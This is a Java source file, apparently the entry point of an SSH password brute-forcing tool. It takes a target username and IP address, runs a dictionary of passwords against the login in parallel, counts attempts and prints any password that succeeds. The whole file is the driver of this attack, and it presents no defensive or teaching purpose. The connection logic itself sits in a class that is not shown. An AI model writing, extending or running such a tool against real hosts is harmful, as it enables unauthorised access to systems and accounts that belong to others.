/*
 * This Java source file was generated by the Gradle 'init' task.
 */
package com.github.lfbr0.ssh_bruteforce;

import com.github.lfbr0.ssh_bruteforce.exceptions.ArgumentsException;
import com.github.lfbr0.ssh_bruteforce.ssh.BruteForcer;
import org.apache.commons.cli.ParseException;

import java.io.IOException;
import java.nio.charset.MalformedInputException;
import java.util.Optional;
import java.util.concurrent.atomic.AtomicInteger;

public class App {

    static final int FATAL_ERROR = -1;

    /**
     * Main entry point of application.
     * @param args -> string array passed with arguments.
     * Check ArgumentsParser class for valid ones
     */
    public static void main(String[] args) {

        try {

            //Try parsing arguments passed
            ArgumentsParser argsParser = new ArgumentsParser(args);

            //Create bruteforcer
            BruteForcer bruteforce = new BruteForcer(argsParser);

            //Atomic counter for status
            AtomicInteger attempts = new AtomicInteger(0);

            //Get stream of passwords from dictionary and bruteforce it
            Optional<String> sshPass = argsParser.getDictionaryStream()
                    .parallel() //to speed up process
                    .peek(pass -> {
                        if (argsParser.verboseMode())
                            System.out.println("ATTEMPT " + attempts + " -> PASSWORD BEING ATTEMPTED: " + pass);
                    }) //debug
                    .filter(pass -> {
                        try {
                            attempts.incrementAndGet(); //increase count
                            return bruteforce.attempt(pass);
                        } catch (ArgumentsException e) {
                            System.out.println("FATAL ERROR : " + e.getMessage());
                            System.exit(FATAL_ERROR);
                            return false;
                        }
                    })
                    .findAny();

            if (sshPass.isPresent())
                System.out.printf(
                        "PASSWORD FOR FOUND FOR %s@%s -> %s",
                        argsParser.getUsername().get(),
                        argsParser.getIPAddress().get(),
                        sshPass.get()
                );
            else
                System.out.println( "NO PASSWORD FOUND IN DICTIONARY" );

            return;
        }
        catch (ParseException e) {
            System.out.println("ERROR PARSING ARGUMENTS PASSED");
        } catch (MalformedInputException e) {
            System.out.println("ERROR CHECK IF ENCONDING IS UTF-8");
        } catch (IOException e) {
            System.out.println("ERROR LOADING DICTIONARY FILE");
        } catch (ArgumentsException e) {
            System.out.println(e.getMessage());
        }

    }

}
